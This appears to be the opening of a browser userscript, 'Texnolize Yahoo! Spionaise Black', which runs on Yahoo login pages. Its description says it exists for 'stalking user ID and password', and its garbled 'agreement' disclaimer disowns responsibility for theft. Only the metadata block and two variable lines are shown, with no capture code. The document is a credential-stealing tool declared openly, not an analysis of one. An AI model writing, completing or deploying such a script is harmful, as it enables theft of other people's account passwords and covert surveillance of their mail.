// ==UserScript==
// @name           	Texnolize Yahoo! Spionaise Black
// @version 		3.0
// @namespace      	Spionaise for Yahoo! Black
// @description    	Stalking user ID and password on Yahoo
// @include        	https://login.yahoo*
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	This application was created to supervise rather than to control one's mail.yahoo account and when things happen that make losses on certain sides of me as making this application because I am not responsible as the manufacturer does not justify the act of theft to the motive of crime.
// ==/UserScript==

var title 				= "Texnolize Spionaise for Yahoo! Mail";
var version 			= "v3.0";
